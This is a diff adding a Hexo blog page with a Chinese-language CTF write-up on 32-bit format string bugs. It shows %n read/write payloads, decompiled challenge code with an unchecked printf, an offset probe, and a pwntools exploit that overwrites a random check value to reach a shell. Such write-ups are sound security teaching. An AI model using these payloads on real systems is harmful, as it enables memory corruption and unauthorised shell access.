@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>format string | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="这里深入回顾一下格式化字符串漏洞（32位） 任意位置读写如果输入内容在栈偏移的第五个字节，可以这样泄露 \x01\x80\x04\x08%5$s 08048001 的内容 同理，\x8c\x97\x04\x08%5$n 可以完成覆盖 08049748c 内容为 4 （前边字符数），而 \x8c\x97\x04\x08%2048c%5$n 可以完成覆盖 08049748c 内容为 2048+4 “一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="format string">
+<meta property="og:url" content="http://example.com/2019/10/04/2019-10-04-printf/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="这里深入回顾一下格式化字符串漏洞（32位） 任意位置读写如果输入内容在栈偏移的第五个字节，可以这样泄露 \x01\x80\x04\x08%5$s 08048001 的内容 同理，\x8c\x97\x04\x08%5$n 可以完成覆盖 08049748c 内容为 4 （前边字符数），而 \x8c\x97\x04\x08%2048c%5$n 可以完成覆盖 08049748c 内容为 2048+4 “一">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-10-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2019-10-04-printf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/04/2019-10-04-printf/" class="article-date">
+  <time class="dt-published" datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      format string
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>这里深入回顾一下格式化字符串漏洞（32位）</p>
+<h2 id="任意位置读写"><a href="#任意位置读写" class="headerlink" title="任意位置读写"></a>任意位置读写</h2><p>如果输入内容在栈偏移的第五个字节，可以这样泄露 <code>\x01\x80\x04\x08%5$s</code> 08048001 的内容</p>
+<p>同理，<code>\x8c\x97\x04\x08%5$n</code> 可以完成覆盖 08049748c 内容为 4 （前边字符数），而 <code>\x8c\x97\x04\x08%2048c%5$n</code> 可以完成覆盖 08049748c 内容为 2048+4</p>
+<h2 id="“一分为四”"><a href="#“一分为四”" class="headerlink" title="“一分为四”"></a>“一分为四”</h2><blockquote>
+<p>以“第五空间”的 五蘊 为例</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // eax</span><br><span class="line">  int fd; // ST14_4</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  unsigned int v5; // et1</span><br><span class="line">  char nptr; // [esp+4h] [ebp-80h]</span><br><span class="line">  char buf; // [esp+14h] [ebp-70h]</span><br><span class="line">  unsigned int v8; // [esp+78h] [ebp-Ch]</span><br><span class="line">  int *v9; // [esp+7Ch] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v9 = &amp;a1;</span><br><span class="line">  v8 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  v1 = time(0);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;unk_804C044, 4u);</span><br><span class="line">  printf(&quot;your name:&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x63u);</span><br><span class="line">  printf(&quot;Hello,&quot;);</span><br><span class="line">  printf(&amp;buf);     ------------------漏洞点</span><br><span class="line">  printf(&quot;your passwd:&quot;);</span><br><span class="line">  read(0, &amp;nptr, 0xFu);</span><br><span class="line">  if ( atoi(&amp;nptr) == unk_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;ok!!&quot;);</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;fail&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  result = 0;</span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  v4 = v5 ^ v8;</span><br><span class="line">  if ( v5 != v8 )</span><br><span class="line">    sub_80493D0(v4);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>main 函数很简单，就是看你输入的和 urandom 一样不，这不废话，我们只能覆盖掉 unk_804C044 内容</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先确定偏移量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">your name:%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x </span><br><span class="line">Hello,fff23058.63.0.fff2307e.3.c2.f7e696bb.fff2307e.fff2317c.252e7825.78252e78.2e78252e</span><br></pre></td></tr></table></figure>
+
+<p>了解了，从第十个字节，之后上 exp ，来自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6431">大佬</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">r=process(&#x27;./5&#x27;)</span><br><span class="line"></span><br><span class="line">target=0x804c044</span><br><span class="line">pay=p32(target)+p32(target+1)+p32(target+2)+p32(target+3)+&#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;</span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">r.sendline(str(0x10101010))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>我们看一下 pay ，第 10 个参数是 0x804c044 这个字节，把它改成 10 ，第 11 个是 0x804c044+1 ，也改成了 10 ，后两个同理，之后直接发送 <code>r.sendline(str(0x10101010))</code> ，就可以了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/04/2019-10-04-printf/" data-id="cuidpbXbKiQXGanIfRt5kYxaM" data-title="format string" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/05/2019-10-05-goods/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Some interesting exercises
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/09/29/2019-09-27-how2heap/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">how2heap</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/01/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
